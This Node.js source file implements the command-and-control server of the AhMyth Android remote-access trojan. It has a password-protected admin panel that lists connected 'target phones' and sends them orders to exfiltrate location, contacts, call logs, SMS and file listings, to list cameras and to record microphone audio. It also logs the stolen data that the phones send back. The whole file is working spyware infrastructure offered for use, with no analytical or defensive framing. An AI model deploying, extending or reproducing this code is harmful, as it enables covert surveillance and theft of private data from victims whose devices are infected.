const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    pingTimeout: 60000,
    pingInterval: 25000
});

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ADMIN';
const AUTH_COOKIE = 'ahmyth_admin_auth';
const SECRET_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD + '_secret_salt').digest('hex');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Active target devices and logs memory
const connectedDevices = new Map();
const deviceLogs = [];

function addLog(msg, type = 'info') {
    const logItem = {
        time: new Date().toLocaleTimeString(),
        msg,
        type
    };
    deviceLogs.unshift(logItem);
    if (deviceLogs.length > 100) deviceLogs.pop();
    io.emit('admin_log', logItem);
}

// Authentication middleware
function requireAuth(req, res, next) {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        return next();
    }
    return res.redirect('/login');
}

// Login Page
app.get('/login', (req, res) => {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        return res.redirect('/admin');
    }
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>AhMyth Admin Login</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0c10; color: #c5c6c7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-card { background: #1f2833; padding: 40px; border-radius: 12px; border: 1px solid #66fcf1; box-shadow: 0 0 20px rgba(102, 252, 241, 0.2); width: 100%; max-width: 400px; text-align: center; }
            h2 { color: #66fcf1; margin-bottom: 20px; font-size: 24px; }
            input[type="password"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #45a29e; border-radius: 6px; background: #0b0c10; color: #fff; font-size: 16px; outline: none; }
            input[type="password"]:focus { border-color: #66fcf1; box-shadow: 0 0 8px rgba(102, 252, 241, 0.4); }
            button { width: 100%; padding: 12px; background: #66fcf1; color: #0b0c10; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: 0.3s; }
            button:hover { background: #45a29e; color: #fff; }
            .error { color: #ff4d4d; margin-bottom: 15px; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>🔒 AhMyth Admin Login</h2>
            ${req.query.error ? '<div class="error">❌ Incorrect Password!</div>' : ''}
            <form action="/login" method="POST">
                <input type="password" name="password" placeholder="Enter Admin Password" required autofocus>
                <button type="submit">LOGIN</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

// Process Login
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.cookie(AUTH_COOKIE, SECRET_TOKEN, { httpOnly: true, maxAge: 86400000 * 7 }); // 7 days
        return res.redirect('/admin');
    }
    res.redirect('/login?error=1');
});

// Logout
app.get('/logout', (req, res) => {
    res.clearCookie(AUTH_COOKIE);
    res.redirect('/login');
});

// Redirect root to /admin
app.get('/', (req, res) => {
    res.redirect('/admin');
});

// Admin Panel Dashboard (Protected)
app.get('/admin', requireAuth, (req, res) => {
    let devicesHtml = '';
    connectedDevices.forEach((device, socketId) => {
        devicesHtml += `
        <div style="border: 1px solid #66fcf1; background: rgba(102,252,241,0.03); padding: 20px; margin-bottom: 20px; border-radius: 8px;">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <h3 style="color:#66fcf1;">📱 ${device.model} (${device.manf})</h3>
                <span style="background:#00ff88; color:#000; padding:3px 10px; border-radius:12px; font-weight:bold; font-size:12px;">ONLINE</span>
            </div>
            <p style="margin-top:8px;"><strong>Device ID:</strong> <code>${device.id}</code> | <strong>Android:</strong> ${device.release} | <strong>IP:</strong> ${device.ip}</p>
            <hr style="border:0.5px solid #333; margin:15px 0;">
            <h4 style="color:#45a29e; margin-bottom:10px;">⚡ Send Command to Target:</h4>
            <form action="/admin/send-order" method="POST" style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
                <input type="hidden" name="socketId" value="${socketId}">
                <select name="order" style="padding: 10px; border-radius: 6px; background: #0b0c10; color: #fff; border: 1px solid #45a29e; font-size:14px;">
                    <option value="x0000lm">📍 Get Location (x0000lm)</option>
                    <option value="x0000cn">👤 Get Contacts (x0000cn)</option>
                    <option value="x0000cl">📞 Get Call Logs (x0000cl)</option>
                    <option value="x0000sm_ls">💬 Get SMS Inbox (x0000sm)</option>
                    <option value="x0000fm_ls">📁 Get File List / (x0000fm)</option>
                    <option value="x0000ca_ls">📷 Get Camera List (x0000ca)</option>
                    <option value="x0000mc">🎙️ Record Mic Audio 10s (x0000mc)</option>
                </select>
                <input type="text" name="extra" placeholder="Extra Param (Path / SMS number)" style="padding: 10px; border-radius: 6px; background: #0b0c10; color: #fff; border: 1px solid #45a29e; flex: 1; min-width:200px;">
                <button type="submit" style="padding: 10px 20px; background: #66fcf1; color: #0b0c10; font-weight: bold; border: none; border-radius: 6px; cursor: pointer;">Send Command</button>
            </form>
        </div>`;
    });

    let logsHtml = deviceLogs.map(l => `<div style="margin-bottom:4px;"><span style="color:#888;">[${l.time}]</span> <span style="color:#66fcf1;">${l.msg}</span></div>`).join('');

    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>AhMyth Admin Dashboard</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0c10; color: #c5c6c7; padding: 20px; }
            .container { max-width: 1000px; margin: 0 auto; }
            header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #66fcf1; padding-bottom: 15px; margin-bottom: 25px; }
            h1 { color: #66fcf1; font-size: 26px; }
            .logout-btn { padding: 8px 16px; background: #ff4d4d; color: #fff; text-decoration: none; font-weight: bold; border-radius: 6px; }
            .card { background: #1f2833; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); margin-bottom: 25px; border: 1px solid #45a29e; }
            .card h2 { color: #66fcf1; margin-bottom: 15px; font-size: 20px; }
            .logs { background: #000; color: #00ff88; padding: 15px; border-radius: 6px; height: 250px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; }
        </style>
    </head>
    <body>
        <div class="container">
            <header>
                <h1>🚀 AhMyth Control Panel</h1>
                <a href="/logout" class="logout-btn">LOGOUT 🔒</a>
            </header>
            
            <div class="card">
                <h2>📊 Server Status</h2>
                <p>Status: <strong style="color:#00ff88;">ONLINE ✅</strong> | Connected Target Phones: <strong>${connectedDevices.size}</strong></p>
            </div>

            <div class="card">
                <h2>📱 Connected Target Devices</h2>
                ${connectedDevices.size > 0 ? devicesHtml : '<p style="color:#aaa;">No device connected right now. Launch the app on target phone to connect.</p>'}
            </div>

            <div class="card">
                <h2>📋 Real-time Activity Logs</h2>
                <div class="logs" id="logsBox">
                    ${logsHtml || '<div>Waiting for device activity...</div>'}
                </div>
            </div>
        </div>
    </body>
    </html>
    `);
});

// Admin command handler
app.post('/admin/send-order', requireAuth, (req, res) => {
    const { socketId, order, extra } = req.body;
    const socket = io.sockets.connected ? io.sockets.connected[socketId] : io.sockets.sockets[socketId];
    
    if (!socket) {
        addLog(`❌ Command failed: Device socket ${socketId} not found or disconnected.`, 'error');
        return res.redirect('/admin');
    }

    let payload = {};
    if (order === 'x0000lm') {
        payload = { order: 'x0000lm' };
    } else if (order === 'x0000cn') {
        payload = { order: 'x0000cn' };
    } else if (order === 'x0000cl') {
        payload = { order: 'x0000cl' };
    } else if (order === 'x0000sm_ls') {
        payload = { order: 'x0000sm', extra: 'ls' };
    } else if (order === 'x0000fm_ls') {
        payload = { order: 'x0000fm', extra: 'ls', path: extra || '/' };
    } else if (order === 'x0000ca_ls') {
        payload = { order: 'x0000ca', extra: 'camList' };
    } else if (order === 'x0000mc') {
        payload = { order: 'x0000mc', sec: parseInt(extra) || 10 };
    } else {
        payload = { order: order, extra: extra };
    }

    socket.emit('order', payload);
    addLog(`➡️ Order Sent to Target [${socketId}]: ${JSON.stringify(payload)}`);
    res.redirect('/admin');
});

// Socket.IO event handler for target APK
io.on('connection', (socket) => {
    const handshake = socket.handshake;
    const query = handshake.query || {};
    const clientIp = handshake.headers['x-forwarded-for'] || handshake.address;

    const deviceObj = {
        model: query.model || 'Unknown Model',
        manf: query.manf || 'Unknown Manufacturer',
        release: query.release || 'Unknown Android Version',
        id: query.id || 'Unknown ID',
        ip: clientIp,
        connectedAt: new Date().toISOString()
    };

    connectedDevices.set(socket.id, deviceObj);
    addLog(`📱 New target connected! Model: ${deviceObj.model} (${deviceObj.manf}), ID: ${deviceObj.id}, IP: ${clientIp}`);

    socket.on('ping', () => {
        socket.emit('pong');
    });

    // Received data events
    socket.on('x0000sm', (data) => addLog(`📥 SMS Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000cl', (data) => addLog(`📥 Call Log Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000cn', (data) => addLog(`📥 Contacts Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000lm', (data) => addLog(`📥 Location Received: ${JSON.stringify(data)}`));
    socket.on('x0000fm', (data) => addLog(`📥 File Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000ca', (data) => addLog(`📥 Camera Data Received: ${JSON.stringify(data)}`));
    socket.on('x0000mc', (data) => addLog(`📥 Mic Audio Data Received`));

    socket.on('disconnect', () => {
        addLog(`🔌 Target phone disconnected: ${deviceObj.model} (${socket.id})`);
        connectedDevices.delete(socket.id);
    });
});

const PORT = process.env.PORT || 40474;
server.listen(PORT, () => {
    console.log(`[🚀] AhMyth Control Server running on port ${PORT}`);
    console.log(`[🔒] Admin Panel URL: http://localhost:${PORT}/admin (Password: ${ADMIN_PASSWORD})`);
});
